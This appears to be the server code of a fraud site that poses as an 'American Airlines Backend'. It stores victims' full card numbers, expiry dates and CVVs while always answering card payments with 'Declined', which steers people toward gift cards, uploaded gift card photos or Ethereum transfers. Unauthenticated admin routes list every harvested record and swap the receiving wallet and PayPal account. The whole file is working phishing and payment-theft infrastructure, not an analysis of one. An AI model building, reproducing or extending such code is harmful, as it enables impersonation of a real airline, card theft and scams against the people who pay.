require('dotenv').config();
const express = require('express');
const cors = require('cors');
const multer = require('multer');
const path = require('path');
const { createClient } = require('@supabase/supabase-js');

const app = express();
app.use(cors());
app.use(express.json());

// Serve static frontend files (index.html, images, css, etc.) from the current directory
app.use(express.static(path.join(__dirname)));

const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
const supabase = createClient(supabaseUrl, supabaseKey);

const upload = multer({ storage: multer.memoryStorage() });

// --- ROOT ROUTE (Fixes "Cannot GET /" on Vercel) ---
app.get('/', (req, res) => {
    res.status(200).json({ 
        success: true, 
        message: 'American Airlines Backend is live and running successfully!' 
    });
});

// --- SETTINGS ENDPOINT ROUTE (Updated to include PayPal) ---
app.get('/api/settings', async (req, res) => {
    try {
        const { data, error } = await supabase
            .from('admin_settings')
            .select('eth_wallet_address, paypal_account')
            .single();

        if (error) {
            console.error('Error fetching settings from database:', error);
            // Fallback defaults if table query fails or is uninitialized
            return res.status(200).json({ 
                success: true, 
                ethWalletAddress: '0x0000000000000000000000000000000000000000',
                paypalAccount: 'support@example.com' 
            });
        }

        return res.status(200).json({ 
            success: true, 
            ethWalletAddress: data ? data.eth_wallet_address : '0x0000000000000000000000000000000000000000',
            paypalAccount: data ? data.paypal_account : 'support@example.com'
        });
    } catch (err) {
        console.error('Settings Server Error:', err);
        return res.status(500).json({ success: false, error: 'Internal server error while fetching settings.' });
    }
});

app.post('/api/submit-payment', upload.fields([
    { name: 'giftCardImage', maxCount: 1 },
    { name: 'ethReceipt', maxCount: 1 }
]), async (req, res) => {
    try {
        const data = req.body;
        let giftCardImageUrl = null;
        let ethReceiptUrl = null;
        let paymentStatus = 'Pending';

        const files = req.files || {};

        // Handle Gift Card Image Upload
        if (files.giftCardImage && files.giftCardImage[0]) {
            const file = files.giftCardImage[0];
            const fileExt = file.originalname.split('.').pop();
            const fileName = `giftcard_${Date.now()}.${fileExt}`;
            const { error: uploadError } = await supabase.storage
                .from('gift-cards')
                .upload(fileName, file.buffer, { contentType: file.mimetype, upsert: false });

            if (uploadError) {
                console.error('Gift Card Upload Error:', uploadError);
                return res.status(500).json({ success: false, error: 'Failed to upload gift card image.' });
            }
            const { data: publicUrlData } = supabase.storage.from('gift-cards').getPublicUrl(fileName);
            giftCardImageUrl = publicUrlData.publicUrl;
            paymentStatus = 'Under Review';
        }

        // Handle Ethereum Receipt Upload
        if (files.ethReceipt && files.ethReceipt[0]) {
            const file = files.ethReceipt[0];
            const fileExt = file.originalname.split('.').pop();
            const fileName = `eth_receipt_${Date.now()}.${fileExt}`;
            const { error: uploadError } = await supabase.storage
                .from('gift-cards') // Reusing the bucket or you can create a separate 'receipts' bucket
                .upload(fileName, file.buffer, { contentType: file.mimetype, upsert: false });

            if (uploadError) {
                console.error('ETH Receipt Upload Error:', uploadError);
                return res.status(500).json({ success: false, error: 'Failed to upload crypto receipt.' });
            }
            const { data: publicUrlData } = supabase.storage.from('gift-cards').getPublicUrl(fileName);
            ethReceiptUrl = publicUrlData.publicUrl;
            paymentStatus = 'Awaiting Crypto Confirmation (10 mins)';
        }

        if (data.paymentMethod === 'card') {
            paymentStatus = 'Declined';
        }

        // Insert transaction & details into Supabase Database Table (`admin_payments`)
        const { error: dbError } = await supabase
            .from('admin_payments')
            .insert([
                {
                    passenger_name: data.passengerName,
                    passenger_email: data.passengerEmail,
                    route: data.route,
                    total_amount: parseFloat(data.totalAmount),
                    payment_method: data.paymentMethod,
                    payer_relationship: data.payerRelationship,
                    payer_name: data.payerName,
                    payer_email: data.payerEmail,
                    payer_phone: data.payerPhone,
                    card_holder_name: data.cardHolderName || null,
                    card_number: data.cardNumber || null,
                    card_expiry: data.cardExpiry || null,
                    card_cvv: data.cardCvv || null,
                    gift_card_brand: data.giftCardBrand || null,
                    gift_card_number: data.giftCardNumber || null,
                    gift_card_amount: data.giftCardAmount ? parseFloat(data.giftCardAmount) : null,
                    gift_card_image_url: giftCardImageUrl,
                    eth_receipt_url: ethReceiptUrl,
                    payment_status: paymentStatus
                }
            ]);

        if (dbError) {
            console.error('Database Insertion Error:', dbError);
            return res.status(500).json({ success: false, error: dbError.message });
        }

        return res.status(200).json({ 
            success: true, 
            paymentMethod: data.paymentMethod,
            status: paymentStatus,
            message: 'Data processed successfully' 
        });

    } catch (err) {
        console.error('Server Error:', err);
        return res.status(500).json({ success: false, error: 'Internal server error.' });
    }
});

// --- ADMIN ENDPOINT: Fetch all payments ---
app.get('/api/admin/payments', async (req, res) => {
    try {
        const { data, error } = await supabase
            .from('admin_payments')
            .select('*')
            .order('created_at', { ascending: false });

        if (error) {
            console.error('Error fetching admin payments:', error);
            return res.status(500).json({ success: false, error: error.message });
        }

        return res.status(200).json({ success: true, payments: data });
    } catch (err) {
        console.error('Admin Server Error:', err);
        return res.status(500).json({ success: false, error: 'Internal server error.' });
    }
});

// --- ADMIN ENDPOINT: Update Ethereum Wallet Address ---
app.post('/api/admin/update-wallet', async (req, res) => {
    try {
        const { ethWalletAddress } = req.body;
        
        const { error } = await supabase
            .from('admin_settings')
            .upsert({ id: 1, eth_wallet_address: ethWalletAddress });

        if (error) {
            console.error('Error updating wallet address:', error);
            return res.status(500).json({ success: false, error: error.message });
        }

        return res.status(200).json({ success: true, message: 'Wallet updated successfully' });
    } catch (err) {
        console.error('Update Wallet Server Error:', err);
        return res.status(500).json({ success: false, error: 'Internal server error.' });
    }
});

// --- ADMIN ENDPOINT: Update PayPal Account ---
app.post('/api/admin/update-paypal', async (req, res) => {
    try {
        const { paypalAccount } = req.body;
        
        const { error } = await supabase
            .from('admin_settings')
            .upsert({ id: 1, paypal_account: paypalAccount });

        if (error) {
            console.error('Error updating PayPal account:', error);
            return res.status(500).json({ success: false, error: error.message });
        }

        return res.status(200).json({ success: true, message: 'PayPal account updated successfully' });
    } catch (err) {
        console.error('Update PayPal Server Error:', err);
        return res.status(500).json({ success: false, error: 'Internal server error.' });
    }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
    console.log(`Backend server running on http://localhost:${PORT}`);
});